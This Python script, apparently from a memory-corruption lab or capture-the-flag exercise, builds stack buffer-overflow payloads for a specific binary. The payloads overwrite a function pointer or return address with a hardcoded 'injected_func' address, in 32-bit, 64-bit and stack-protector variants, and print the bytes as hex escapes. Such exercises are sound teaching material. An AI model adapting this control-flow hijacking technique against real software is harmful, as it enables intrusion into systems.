#!/usr/bin/env python3

import struct

# 32 bits
actual_func = 0x08048546
injected_func = 0x0804855f

offset = 0x1c-0xc
payload = offset * b"A" + struct.pack("<I", injected_func)
print("overwrite func_ptr (32 bits): ", end='')
print(''.join("\\x{:02x}".format(b) for b in payload))

payload = offset * b"A" + struct.pack("<I", actual_func) + 12 * b"A" + struct.pack("<I", injected_func)
print("overwrite return address (32 bits): ", end='')
print(''.join("\\x{:02x}".format(b) for b in payload))


# 64 bits
actual_func = 0x400697
injected_func = 0x4006a8

offset = 0x20-0x08
payload = offset * b"A" + struct.pack("<Q", injected_func)
print("overwrite func_ptr (64 bits): ", end='')
print(''.join("\\x{:02x}".format(b) for b in payload))

payload = offset * b"A" + struct.pack("<Q", actual_func) + 8 * b"A" + struct.pack("<Q", injected_func)
print("overwrite return address (64 bits): ", end='')
print(''.join("\\x{:02x}".format(b) for b in payload))


# SSP, 64 bits
injected_func = 0x400718
offset = 0x20+0x08
payload = offset * b"A" + struct.pack("<Q", injected_func)
print("overwrite return address (SSP, 64 bits): ", end='')
print(''.join("\\x{:02x}".format(b) for b in payload))
